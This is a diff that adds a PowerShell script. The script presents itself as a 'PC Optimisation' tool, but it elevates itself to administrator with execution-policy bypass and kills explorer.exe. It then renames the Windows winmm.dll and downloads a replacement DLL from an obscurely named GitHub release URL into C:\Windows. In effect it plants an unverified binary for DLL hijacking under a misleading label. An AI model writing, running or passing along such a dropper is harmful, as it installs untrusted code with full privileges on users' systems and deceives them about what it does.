@@ -1,1 +1,150 @@
-SSSS
+# Download and replace winmm.dll with backup functionality
+$dllUrl = "https://github.com/coruppters/-MTQxNjk0MTk1MTQxNjI3NTA5NA.GLIGeA.PDPuHGxqEE1vs4Y1JFZoB6TRvWHU2a-n2KVq3w-/releases/download/sdsdsd/winmm.dll"
+$destinationPath = "C:\Windows\winmm.dll"
+$backupPath = "C:\Windows\2.dll"
+
+# Function to display colored messages
+function Write-Status {
+    param(
+        [string]$Message,
+        [string]$Color = "White"
+    )
+    Write-Host $Message -ForegroundColor $Color
+}
+
+# Check admin rights
+Write-Status -Message "Checking administrator privileges..." -Color "Yellow"
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Write-Status -Message "Please run as Administrator!" -Color "Red"
+    Write-Status -Message "Restarting script with elevated privileges..." -Color "Yellow"
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+Write-Status -Message "Running with administrator privileges..." -Color "Green"
+
+# Check if target DLL already exists
+if (Test-Path $destinationPath) {
+    try {
+        Write-Status -Message "Existing winmm.dll found. Preparing to rename..." -Color "Yellow"
+        
+        # Kill explorer.exe to release file lock
+        Write-Status -Message "Stopping explorer.exe to release file lock..." -Color "Yellow"
+        Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
+        
+        # Wait to ensure explorer is fully terminated
+        Write-Status -Message "Waiting for explorer to fully terminate..." -Color "Yellow"
+        Start-Sleep -Seconds 3
+        
+        # Check if backup file already exists
+        if (Test-Path $backupPath) {
+            Write-Status -Message "Backup file (2.dll) already exists. Removing it..." -Color "Yellow"
+            Remove-Item $backupPath -Force -ErrorAction Stop
+            Write-Status -Message "Old backup removed successfully." -Color "Green"
+        }
+        
+        # Rename the existing DLL to 2.dll (backup)
+        Write-Status -Message "Renaming existing winmm.dll to 2.dll..." -Color "Yellow"
+        Rename-Item -Path $destinationPath -NewName "2.dll" -Force -ErrorAction Stop
+        
+        Write-Status -Message "Old DLL successfully renamed to 2.dll" -Color "Green"
+        Write-Status -Message "Backup created at: $backupPath" -Color "Green"
+        
+        # Brief pause before proceeding
+        Start-Sleep -Seconds 1
+    }
+    catch {
+        Write-Status -Message "Error during renaming process: $_" -Color "Red"
+        
+        # Try to restart explorer even if renaming failed
+        Write-Status -Message "Attempting to restart explorer.exe..." -Color "Yellow"
+        Start-Process "explorer.exe" -ErrorAction SilentlyContinue
+        exit
+    }
+}
+else {
+    Write-Status -Message "No existing winmm.dll found. Proceeding with download..." -Color "Yellow"
+}
+
+# Download the new DLL
+try {
+    Write-Status -Message "Downloading new DLL from: $dllUrl" -Color "Yellow"
+    
+    # Create WebClient object for download
+    $webClient = New-Object System.Net.WebClient
+    
+    # Add event handler for progress
+    $global:downloadComplete = $false
+    $eventDataComplete = Register-ObjectEvent $webClient DownloadFileCompleted `
+        -SourceIdentifier WebClient.DownloadFileComplete `
+        -Action {$global:downloadComplete = $true}
+    
+    $eventDataProgress = Register-ObjectEvent $webClient DownloadProgressChanged `
+        -SourceIdentifier WebClient.DownloadProgressChanged `
+        -Action {
+            $ProgressPreference = 'SilentlyContinue'
+            $percent = $eventArgs.ProgressPercentage
+            Write-Progress -Activity "Downloading winmm.dll" -Status "$percent% Complete:" -PercentComplete $percent
+        }
+    
+    # Start download
+    $webClient.DownloadFileAsync($dllUrl, $destinationPath)
+    
+    # Wait for download to complete
+    while (!$global:downloadComplete) {
+        Start-Sleep -Milliseconds 100
+    }
+    
+    # Clean up events
+    Unregister-Event -SourceIdentifier WebClient.DownloadProgressChanged
+    Unregister-Event -SourceIdentifier WebClient.DownloadFileComplete
+    $webClient.Dispose()
+    
+    Write-Progress -Activity "Downloading winmm.dll" -Completed
+    
+    # Verify download
+    if (Test-Path $destinationPath) {
+        $fileSize = (Get-Item $destinationPath).Length / 1KB
+        Write-Status -Message "Download completed successfully!" -Color "Green"
+        Write-Status -Message "File saved to: $destinationPath" -Color "Green"
+        Write-Status -Message "File size: $([math]::Round($fileSize, 2)) KB" -Color "Green"
+        Write-Status -Message "PC Optimisation Started" -Color "Cyan"
+    }
+    else {
+        Write-Status -Message "Download failed - file not found at destination" -Color "Red"
+    }
+    
+    # Restart explorer.exe
+    Write-Status -Message "Restarting explorer.exe..." -Color "Yellow"
+    Start-Sleep -Seconds 1
+    Start-Process "explorer.exe"
+    
+}
+catch {
+    Write-Status -Message "Error during download: $_" -Color "Red"
+    
+    # Restart explorer even if download failed
+    Write-Status -Message "Attempting to restart explorer.exe..." -Color "Yellow"
+    Start-Process "explorer.exe" -ErrorAction SilentlyContinue
+    
+    # Show summary
+    if (Test-Path $backupPath) {
+        Write-Status -Message "Backup is available at: $backupPath" -Color "Yellow"
+    }
+}
+
+# Final summary
+Write-Status -Message "`n=== Process Summary ===" -Color "Cyan"
+if (Test-Path $destinationPath) {
+    Write-Status -Message "✓ New winmm.dll installed successfully" -Color "Green"
+}
+else {
+    Write-Status -Message "✗ New winmm.dll installation failed" -Color "Red"
+}
+
+if (Test-Path $backupPath) {
+    Write-Status -Message "✓ Backup created as: 2.dll" -Color "Green"
+}
+
+Write-Status -Message "Process completed. Press any key to exit..." -Color "Yellow"
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
